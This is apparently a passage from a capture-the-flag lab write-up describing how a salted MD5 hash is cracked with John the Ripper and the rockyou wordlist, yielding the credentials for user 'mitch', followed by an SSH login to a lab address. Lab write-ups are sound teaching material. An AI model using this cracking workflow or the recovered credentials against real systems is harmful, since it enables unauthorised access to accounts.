## johntheripper to crack hash - 
To be able to crack the hash with John we need the format of this hash, especially here that the hash has salt. But where can we find this? If we look carefully inside the script we can find the format.

The format is MD(salt + password). Now we can use john to crack the password. First we need to create a txt file with the format _HASH$SALT_.
**Command** - 
```python
john -form=dynamic='md5($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt temp_hash.txt
```
password - secret
username - mitch

## SSH to the machine - 
```python
ssh mitch@10.10.68.244 -p 2222
```
